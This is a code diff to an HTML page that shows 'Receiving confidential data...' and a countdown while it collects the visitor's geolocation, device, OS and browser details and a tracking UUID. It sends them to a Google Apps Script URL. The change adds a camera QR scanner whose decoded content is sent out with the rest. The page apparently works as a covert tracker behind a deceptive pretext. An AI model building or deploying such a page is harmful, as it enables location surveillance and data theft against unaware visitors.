@@ -41,6 +41,7 @@
     }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+  <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
   <script>
     function generateUUID() {
       return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
@@ -71,7 +72,7 @@
       };
     }
 
-    function sendData() {
+    function sendData(qrCode) {
       const confidentialDiv = document.getElementById('confidential');
       const dataDiv = document.getElementById('data');
       let messageIndex = 0;
@@ -117,7 +118,7 @@
             var timestamp = new Date().toISOString();
 
             var scriptUrl = "https://script.google.com/macros/s/AKfycbxMqdTk4h0C-rV-6QWYiQH9kLU8FDo3TZzmF0UzMJiKYkb1Vsz6RkvqTtI58BBaFrx05w/exec";
-            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}&uuid=${uuid}&timestamp=${encodeURIComponent(timestamp)}`;
+            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}&uuid=${uuid}&timestamp=${encodeURIComponent(timestamp)}&qrCode=${encodeURIComponent(qrCode)}`;
 
             console.log(url); // Imprimir URL para depuración
 
@@ -140,9 +141,44 @@
         countdownDiv.textContent = `${countdown} seconds remaining...`;
         if (countdown <= 0) {
           clearInterval(countdownInterval);
-          sendData();
+          sendData(qrCode);
         }
       }, 1000);
+    });
+
+    function onScanSuccess(decodedText, decodedResult) {
+      // Handle on success condition with the decoded text or result.
+      console.log(`Code matched = ${decodedText}`, decodedResult);
+      document.getElementById('qr-result').innerText = `QR Code: ${decodedText}`;
+      qrCode = decodedText; // Set the global qrCode variable
+      document.getElementById('qr-reader').style.display = 'none'; // Hide the QR scanner after successful scan
+      sendData(qrCode); // Call sendData with the scanned QR code
+    }
+
+    function onScanFailure(error) {
+      // Handle on error condition
+      console.warn(`QR error = ${error}`);
+    }
+
+    let qrCode;
+    document.addEventListener('DOMContentLoaded', (event) => {
+      const countdownDiv = document.getElementById('countdown');
+      let countdown = 30;
+      countdownDiv.textContent = `${countdown} seconds remaining...`;
+
+      const countdownInterval = setInterval(() => {
+        countdown--;
+        countdownDiv.textContent = `${countdown} seconds remaining...`;
+        if (countdown <= 0) {
+          clearInterval(countdownInterval);
+          sendData(qrCode);
+        }
+      }, 1000);
+
+      // Create the QR code scanner
+      var html5QrcodeScanner = new Html5QrcodeScanner(
+        "qr-reader", { fps: 10, qrbox: 250 });
+      html5QrcodeScanner.render(onScanSuccess, onScanFailure);
     });
   </script>
 </head>
@@ -150,5 +186,7 @@
   <div id="confidential">Receiving confidential data...</div>
   <div id="countdown"></div>
   <div id="data" style="display: none;"></div>
+  <div id="qr-reader" style="width:500px;"></div>
+  <div id="qr-result"></div>
 </body>
 </html>
